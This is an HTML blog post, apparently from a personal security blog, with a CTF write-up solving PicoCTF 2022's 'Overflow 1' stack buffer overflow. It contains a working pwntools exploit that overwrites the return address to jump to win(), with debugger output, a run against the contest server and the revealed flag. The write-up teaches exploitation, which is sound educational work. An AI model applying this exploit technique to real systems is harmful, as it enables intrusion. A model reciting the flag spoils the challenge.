@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Dan Quixote Codes - PicoCTF 2022: Overflow 1</title>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Pelican" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- Bootstrap CSS -->
+  <!--<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">-->
+
+  <!-- Syntax -->
+  <link rel="stylesheet" href="/theme/css/pygment.css">
+
+  <!-- Fonts -->
+  <link rel="stylesheet" href="/theme/css/fonts.css">
+  <!-- Custom bootstrap -->
+  <link rel="stylesheet" href="/theme/css/theme.css">
+   
+
+  
+
+
+    <meta name="tags" content="CTF" />
+    <meta name="tags" content="picoCTF" />
+    <meta name="tags" content="write-up" />
+    <meta name="tags" content="binexp" />
+
+</head>
+
+<body>
+  <div class="container-xxl maincontent">
+
+      <!-- Page Header -->
+      <header>
+	<div class="jumbotron p-3 p-md-5 my-rounded my-highlight d-none d-lg-block">
+          <div class="col-md-9 px-0">
+	    <h1 class="display-1">
+	      Dan Quixote Codes
+	    </h1>
+	    
+	    <p class="lead terminal"> Adventures in Teaching, Programming, and Cyber Security.</p>
+          </div>
+	</div>
+	  
+<nav class="navbar navbar-expand-lg mt-1">
+  <div class="container-fluid">
+    <a class="navbar-brand d-lg-none" href="/">Dan Quixote Codes</a>
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navtoggle bi bi-arrows-expand"></span>
+      <!--<span class="navtoggle bi bi-arrows-collapse"></span>-->
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+        <li class="nav-item">
+	  
+	  <a 	     class="nav-link"
+	     href="/">Blog</a>
+        </li>
+      </ul>
+      <ul class="d-flex navbar-nav">
+	<li class="nav-item ml-auto">
+	  <a class="nav-link" href="/pages/about-me.html">About</a>
+	</li>
+      </ul>
+    </div>
+  </div>
+</nav>      
+      </header><!-- /#banner -->
+      
+      <div class="row mt-5"> 	<!-- Page Content -->
+	<div class="col">
+    
+    <section id="content" class="body">
+  <header class="terminal">
+    <h2 class="entry-title">
+      <a class="dark-terminal" href="/">~/blog$ </a><a href="/picoctf-2022-overflow-1.html" rel="bookmark"
+         title="Permalink to PicoCTF 2022: Overflow 1">PicoCTF 2022:  Overflow 1</a></h2>
+ 
+  </header>
+
+  
+  <footer class="post-info dark-terminal">
+    <span>Published:</span>
+    <time class="published" datetime="2022-04-06T19:00:00+01:00">
+      Wed 06 April 2022
+    </time>
+    <address class="vcard author">
+      Author       <i class="bi bi-person"></i> <a class="url fn" href="/author/dang.html">DanG</a>
+    </address>
+    <div class="category">
+        In: <a href="/category/picoctf.html">PicoCTF</a>
+    </div>
+    <div class="tags">
+        Tags:
+            <i class="bi bi-tag"></i><a href="/tag/ctf.html">CTF</a>
+            <i class="bi bi-tag"></i><a href="/tag/picoctf.html">picoCTF</a>
+            <i class="bi bi-tag"></i><a href="/tag/write-up.html">write-up</a>
+            <i class="bi bi-tag"></i><a href="/tag/binexp.html">binexp</a>
+    </div>
+  </footer><!-- /.post-info -->
+  <div class="entry-content pt-2">
+    <h1>Overflow 1</h1>
+<p>Overflow 1 was a 200 point  Binexp box from PicoCTF 2022</p>
+<blockquote>
+<p>Control the Return Address</p>
+</blockquote>
+<h1>Looking at the program</h1>
+<h2>Checksec flags</h2>
+<p>First lets see what checksec says about the file.</p>
+<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="n">env</span><span class="p">)</span><span class="w"> </span><span class="n">dang</span><span class="nv">@danglaptop</span><span class="w"> </span><span class="o">~/</span><span class="n">Github</span><span class="o">/</span><span class="n">Pico2022</span><span class="o">/</span><span class="n">BinExp</span><span class="o">/</span><span class="n">Overflow1</span><span class="err">$</span><span class="w"> </span><span class="n">checksec</span><span class="w"> </span><span class="n">vuln</span><span class="w">           </span><span class="err">✚</span><span class="w"> </span><span class="err">✭</span><span class="n">main</span><span class="w"> </span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="s1">&#39;/home/dang/Github/Pico2022/BinExp/Overflow1/vuln&#39;</span><span class="w"></span>
+<span class="w">    </span><span class="nl">Arch</span><span class="p">:</span><span class="w">     </span><span class="n">i386</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="n">little</span><span class="w"></span>
+<span class="w">    </span><span class="nl">RELRO</span><span class="p">:</span><span class="w">    </span><span class="k">Partial</span><span class="w"> </span><span class="n">RELRO</span><span class="w"></span>
+<span class="w">    </span><span class="nl">Stack</span><span class="p">:</span><span class="w">    </span><span class="k">No</span><span class="w"> </span><span class="n">canary</span><span class="w"> </span><span class="k">found</span><span class="w"></span>
+<span class="w">    </span><span class="nl">NX</span><span class="p">:</span><span class="w">       </span><span class="n">NX</span><span class="w"> </span><span class="n">disabled</span><span class="w"></span>
+<span class="w">    </span><span class="nl">PIE</span><span class="p">:</span><span class="w">      </span><span class="k">No</span><span class="w"> </span><span class="n">PIE</span><span class="w"> </span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span><span class="w"></span>
+<span class="w">    </span><span class="nl">RWX</span><span class="p">:</span><span class="w">      </span><span class="n">Has</span><span class="w"> </span><span class="n">RWX</span><span class="w"> </span><span class="n">segments</span><span class="w"></span>
+</code></pre></div>
+
+<p>We have a 32 bit binary,  without any protections enabled, "easymode" is certainly turned on here.</p>
+<h2>Looking at the program</h2>
+<p>Looking at the supplied source code, we see the flow of the challenge.</p>
+<p>The <code>vuln()</code> function, has a call to <code>gets</code> that is going to let us overflow  32 bit buffer.</p>
+<div class="highlight"><pre><span></span><code><span class="n">void</span><span class="w"> </span><span class="n">vuln</span><span class="p">()</span><span class="err">{</span><span class="w"></span>
+<span class="w">  </span><span class="nc">char</span><span class="w"> </span><span class="n">buf</span><span class="o">[</span><span class="n">BUFSIZE</span><span class="o">]</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="ss">&quot;Okay, time to return... Fingers Crossed... Jumping to 0x%x\n&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">get_return_address</span><span class="p">());</span><span class="w"></span>
+<span class="err">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>There is a second <code>win()</code> function that is going to give us the flag. </p>
+<h1>POC</h1>
+<p>Our Initial proof of concept becomes something like this</p>
+<ul>
+<li>Overflow the buffer to control IP</li>
+<li>Stick the address of the Win function in IP</li>
+<li>....</li>
+<li>Profit</li>
+</ul>
+<p>We will use the wonderful <a href="https://docs.pwntools.com/en/stable/">pwntools</a> to get our POC working</p>
+<h2>Working out IP</h2>
+<p>Let write a script that uses pwntools an cyclic to get the offset to IP</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#Start a Process</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./vuln&quot;</span><span class="p">)</span>
+
+<span class="c1">#Read the initial data</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+<span class="n">log</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Data is </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+<span class="c1"># Code for Offset</span>
+<span class="n">pause</span><span class="p">()</span>  <span class="c1">#Let me attach GDB</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">50</span><span class="p">))</span>
+
+<span class="c1"># Let things break</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<p>Running our program, and attaching GDB to the process (I still cant get my tiling WM, GDB and Pwn to play together nicely) we see that the offset is at <strong>44</strong> bytes.</p>
+<p>Catch the contents of cyclic in GDB</p>
+<div class="highlight"><pre><span></span><code>────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x6161616c
+────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;vuln&quot;, stopped 0x6161616c in ?? (), reason: SIGSEGV
+──────────────────────────────────────────────────────────────────────────────── trace ────
+───────────────────────────────────────────────────────────────────────────────────────────
+gef➤  
+</code></pre></div>
+
+<p>Lookup the offset</p>
+<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="n">env</span><span class="p">)</span><span class="w"> </span><span class="n">dang</span><span class="nv">@danglaptop</span><span class="w"> </span><span class="o">~/</span><span class="n">Github</span><span class="o">/</span><span class="n">Pico2022</span><span class="o">/</span><span class="n">BinExp</span><span class="o">/</span><span class="n">Overflow1</span><span class="err">$</span><span class="w"> </span><span class="n">cyclic</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="mh">0x6161616c</span><span class="w"> </span>
+<span class="mi">44</span><span class="w"></span>
+</code></pre></div>
+
+<h2>Address to Jump to</h2>
+<p>We also need the address of the <code>win()</code> function.</p>
+<p>As the program is compiled without PIE, this wont change, making it super easy to find.  Given the program is nice and simple, I just use objdump, rahter than firing up R2. Locating the entrypoint at <code>0x80491f6</code></p>
+<div class="highlight"><pre><span></span><code>objdump -D vuln
+
+....
+
+080491f6 &lt;win&gt;:
+ 80491f6:       f3 0f 1e fb             endbr32 
+ 80491fa:       55                      push   %ebp
+ 80491fb:       89 e5                   mov    %esp,%ebp
+</code></pre></div>
+
+<h1>Exploit Code</h1>
+<p>Lets stick the values we have into some exploit code.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># Start the Process</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./vuln&quot;</span><span class="p">)</span>  <span class="c1">#Local</span>
+<span class="c1">#p = remote(&quot;saturn.picoctf.net&quot;, 50823) #Remote</span>
+
+<span class="n">OFFSET</span> <span class="o">=</span> <span class="mi">44</span>
+<span class="n">ADDR</span> <span class="o">=</span> <span class="mh">0x080491f6</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;---- Start Exploit ----&quot;</span><span class="p">)</span>
+
+<span class="c1">#Read input</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Data is </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+
+<span class="c1"># Build and send the Payload</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">OFFSET</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ADDR</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="c1">#</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Flag is </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</code></pre></div>
+
+<p>When we run this we get the following.  The text with "flag.txt" is in our win function so we know we are OK</p>
+<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="n">env</span><span class="p">)</span><span class="w"> </span><span class="n">dang</span><span class="nv">@danglaptop</span><span class="w"> </span><span class="o">~/</span><span class="n">Github</span><span class="o">/</span><span class="n">Pico2022</span><span class="o">/</span><span class="n">BinExp</span><span class="o">/</span><span class="n">Overflow1</span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="n">exploit</span><span class="p">.</span><span class="n">py</span><span class="w">     </span><span class="err">✹</span><span class="w"> </span><span class="err">✚</span><span class="w"> </span><span class="err">✭</span><span class="n">main</span><span class="w"> </span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Starting</span><span class="w"> </span><span class="k">local</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="s1">&#39;./vuln&#39;</span><span class="err">:</span><span class="w"> </span><span class="n">pid</span><span class="w"> </span><span class="mi">278648</span><span class="w"></span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="o">----</span><span class="w"> </span><span class="k">Start</span><span class="w"> </span><span class="n">Exploit</span><span class="w"> </span><span class="o">----</span><span class="w"></span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="k">Data</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">b</span><span class="s1">&#39;Please enter your string: \n&#39;</span><span class="w"></span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Flag</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">b</span><span class="ss">&quot;Okay, time to return... Fingers Crossed... Jumping to 0x80491f6\nPlease create &#39;flag.txt&#39; in this directory with your own debugging flag.\n&quot;</span><span class="w"></span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Process</span><span class="w"> </span><span class="s1">&#39;./vuln&#39;</span><span class="w"> </span><span class="n">stopped</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="k">exit</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">(</span><span class="n">pid</span><span class="w"> </span><span class="mi">278648</span><span class="p">)</span><span class="w"></span>
+</code></pre></div>
+
+<h2>Running on the Remote</h2>
+<p>To modify our progarm to run on the remote we just need to change
+how the process is created, using the built in <code>rempte</code> function to connect.</p>
+<div class="highlight"><pre><span></span><code>#p = process(&quot;./vuln&quot;)  #Local
+p = remote(&quot;saturn.picoctf.net&quot;, 50823) #Remote
+</code></pre></div>
+
+<p>Which gives us (newlines added by me)</p>
+<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="n">env</span><span class="p">)</span><span class="w"> </span><span class="n">dang</span><span class="nv">@danglaptop</span><span class="w"> </span><span class="o">~/</span><span class="n">Github</span><span class="o">/</span><span class="n">Pico2022</span><span class="o">/</span><span class="n">Overflow1</span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="n">exploit</span><span class="p">.</span><span class="n">py</span><span class="w">                     </span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Opening</span><span class="w"> </span><span class="k">connection</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">saturn</span><span class="p">.</span><span class="n">picoctf</span><span class="p">.</span><span class="n">net</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">50823</span><span class="err">:</span><span class="w"> </span><span class="n">Done</span><span class="w"></span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="o">----</span><span class="w"> </span><span class="k">Start</span><span class="w"> </span><span class="n">Exploit</span><span class="w"> </span><span class="o">----</span><span class="w"></span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="k">Data</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">b</span><span class="s1">&#39;Please enter your string: \n&#39;</span><span class="w"></span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Flag</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">b</span><span class="ss">&quot;Okay, time to return... Fingers Crossed... Jumping to 0x80491f6</span>
+<span class="ss">picoCTF{addr3ss3s_ar3_3asy_c76b273b}&quot;</span><span class="w"></span>
+</code></pre></div>
+  </div><!-- /.entry-content -->
+</section>
+	</div>
+	
+      </div>     </div> 
+  <!-- Option 1: Bootstrap Bundle with Popper -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-ygbV9kiqUc6oa4msXn9868pTtWMgiQaeYH7/t7LECLbyPA2x65Kgf80OJFdroafW" crossorigin="anonymous"></script>
+
+</body>
